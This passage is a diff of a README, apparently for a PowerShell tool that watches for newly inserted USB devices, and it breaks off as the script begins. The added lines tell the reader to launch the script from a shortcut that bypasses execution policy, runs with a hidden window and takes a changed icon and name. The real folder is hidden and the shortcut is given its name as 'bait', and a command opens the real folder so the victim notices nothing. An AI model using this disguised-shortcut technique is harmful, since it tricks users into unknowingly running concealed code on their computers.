@@ -146,9 +146,18 @@ The Script can be executed through a shortcut with the following options:
 ```
 powershell.exe -executionpolicy bypass -noexit -windowstyle hidden
 ```
-additionally should the run option be set to Minimized and the Icon and Name has to be changed.
 
-Script to start a sub process that listenes to newly inserted USB devices.
+Additionally should the run option be set to Minimized and the Icon and Name has to be changed.
+
+If a folder is supposed to be the "bait", the folder needs to be hidden and the name copied.
+
+This needs to be added at the end of the command:
+```
+explorer.exe .\<<folder>>
+```
+This opens a new explorer window with the open folder. 
+
+The script to start a sub process that listenes to newly inserted USB devices:
 ```
 # .Net methods for hiding/showing the console in the background
 Add-Type -Name Window -Namespace Console -MemberDefinition '
